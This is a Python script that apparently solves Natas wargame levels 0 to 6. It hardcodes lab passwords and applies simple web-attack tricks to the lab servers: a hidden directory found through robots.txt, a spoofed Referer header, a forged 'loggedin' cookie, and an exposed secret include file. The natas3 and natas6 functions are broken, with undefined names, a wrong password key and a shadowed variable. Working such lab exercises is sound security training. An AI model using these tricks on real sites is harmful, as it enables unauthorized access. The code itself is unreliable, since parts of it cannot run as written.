import requests
from bs4 import BeautifulSoup
import re, os
import html

url = {
    "natas0": "http://natas0.natas.labs.overthewire.org",
    "natas1": "http://natas1.natas.labs.overthewire.org",
    "natas2": "http://natas2.natas.labs.overthewire.org",
    "natas3": "http://natas3.natas.labs.overthewire.org",
    "natas4": "http://natas4.natas.labs.overthewire.org",
    "natas5": "http://natas5.natas.labs.overthewire.org",
    "natas6": "http://natas6.natas.labs.overthewire.org",
    "natas7": "http://natas7.natas.labs.overthewire.org",
    "natas8": "http://natas8.natas.labs.overthewire.org",
    "natas9": "http://natas9.natas.labs.overthewire.org",
    "natas10": "http://natas10.natas.labs.overthewire.org"
}
username = {
    "natas0": "natas0",
    "natas1": "natas1",
    "natas2": "natas2",
    "natas3": "natas3",
    "natas4": "natas4",
    "natas5": "natas5",
    "natas6": "natas6",
    "natas7": "natas7",
    "natas8": "natas8",
    "natas9": "natas9",
    "natas10": "natas10"
}
password = {
    "natas0": "natas0",
    "natas1": "g9D9cREhslqBKtcA2uocGHPfMZVzeFK6",
    "natas2": "h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7",
    "natas3": "G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q",
    "natas4": "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm",
    "natas5": "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD",
    "natas6": "fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR",
    "natas7": "",
    "natas8": "",
    "natas9": "",
    "natas10": ""
}


def tags_pattern(html_text, src, href):
    # Define the patterns
    src_pattern = r'<img\s+src="([^"]+)"'
    href_pattern = r'<a\s+href="([^"]+)"'
    html_text = str(html_text)
    # Extract matches
    src_matches = re.findall(src_pattern, html_text)
    href_matches = re.findall(href_pattern, html_text)

    # Initialize sets
    src_set = set()
    href_set = set()

    # Process src matches
    for match in src_matches:
        parts = match.split('/')
        for i in range(1, len(parts) + 1):
            src_set.add('/'.join(parts[:i]))

    # Process href matches
    for match in href_matches:
        parts = match.split('/')
        for i in range(1, len(parts) + 1):
            href_set.add('/'.join(parts[:i]))
    if src:
        return src_set
    if href:
        return href_set
def natas0():
    response = requests.get(url["natas0"], auth=(username["natas0"], password["natas0"]))
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)

def natas1():
    response = requests.get(url["natas1"], auth=(username["natas1"], password["natas1"]))
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)
def natas2():
    response = requests.get(str(url["natas2"]), auth=(username["natas2"], password["natas2"]))
    soup = BeautifulSoup(response.text, 'html.parser')
    for x in tags_pattern(soup.body, src=True, href=True):
        if x[-4] == '.':
            pass
        else:
            print(x)
            new_url = url["natas2"] + "/" + x
            print(new_url)
            response_new = requests.get(new_url, auth=(username["natas2"], password["natas2"]))
            soup_new = BeautifulSoup(response_new.text, 'html.parser')
            for y in tags_pattern(soup_new.body, src=False, href=True):
                root, ext = os.path.splitext(y)
                if ext == '.txt':
                    print(y)
                    new_url = new_url + "/" + y
                    print(new_url)
                    response_new = requests.get(new_url, auth=(username["natas2"], password["natas2"]))
                    soup_new = BeautifulSoup(response_new.text, 'html.parser')
                    print(soup_new.text)
                # new_url = url["natas2"] + "/" + y
                # print(new_url)
                # response_new = requests.get(new_url, auth=(username["natas2"], password["natas2"]))
                # soup_new = BeautifulSoup(response_new.text, 'html.parser')
                # print(soup_new.body)


def natas3():
    AUTH = requests.auth.HTTPBasicAuth(username["natas3"], password["natas3"])
    session = requests.Session()
    session.auth = AUTH
    response = session.get(url=url["natas3"])
    soup = BeautifulSoup(response.text, 'html.parser')
    body = soup.find('body')
    div_content = body.find('div', {'id': 'content'})
    print(f'{div_content}\n')
    response = requests.get(url=url["natas3"] + '/robots.txt')
    print(f'{response.text}\n')
    s3cr3t = re.search(r'Disallow: (/\w+/)', response.text).group(1)
    response = session.get(url=url["natas3"] + s3cr3t)
    soup = BeautifulSoup(response.text, 'html.parser')
    a = soup.find('a', {'href' : 'users.txt'})
    print(f'{a}\n')
    users = re.search(r'>(.+)<', str(a)).group(1)
    response = session.get(url=url["natas3"] + s3cr3t + users)
    password = re.search(r'natas4:(\w+)', response.text).group(1)
    print(f'natas4 password: {password}')

def natas4():
    response = requests.get(url["natas4"], auth=(username["natas4"], password["natas4"]),
                            headers={'Referer': 'http://natas5.natas.labs.overthewire.org/'})
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)

def natas5():
    response = requests.get(url["natas5"], auth=(username["natas5"], password["natas5"]), cookies={'loggedin': '1'})
    soup = BeautifulSoup(response.text, 'html.parser')
    print(soup.body)

def natas6():
    response = requests.get(url["natas6"], auth=(username["natas6"], password["natas4"]))

    div_content = soup.find('body').find('div', {'id': 'content'})
    print(f'{div_content}\n')

    # get source code
    response = requests.get(url["natas6"] + 'index-source.html')
    # the response contains the source code as encoded html file, e.g. &lt; which should've been <br
    # therefore, we can use html.unescape() to decoded the html file
    source = html.unescape(response.text).replace('<br />', '')
    # html.parser didn't manage to find the div tag with id=content
    # I think it's because the closing tag contains id property, which is not valid
    # reference: https://stackoverflow.com/questions/8887015/closing-tag-with-id-property
    soup = BeautifulSoup(source, 'lxml')
    div = soup.find('div').prettify()
    print(f'{div}\n')

    # as we can see from the source code, specifically from the php code,
    # there is a filepath to includes/secret.inc
    # let's find out the content of the file
    response = session.get(URL + 'includes/secret.inc')
    print(response.text)
    # although the includes directory is properly protected with access control
    # the file secret.inc is accessible

    """
    From burpsuite:
    secret=FOEIUWGHFEEUHOFUOIU&submit=Submit+Query
    """
    # therefore, we need to use both 'secret' and 'submit' as the keys to the data
    # that we will send through the POST request
    regex_search = re.search(r'\$(\w+) = "(\w+)";', response.text)
    data = {
        regex_search.group(1): regex_search.group(2),
        # submit accepts any value, here, I just simply follow the value used by burpsuite
        'submit': 'Submit+Query'
    }
    response = session.post(URL, data=data)
    soup = BeautifulSoup(response.text, 'html.parser')
    div_content = soup.body.find(id='content')
    # natas7 password: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
    password = re.search(r'is (\w+)', str(div_content)).group(1)
    print(f'natas7 password: {password}')


# natas0()
# natas1()
# natas2()
# natas3()
# natas4()
# natas5()
natas6()


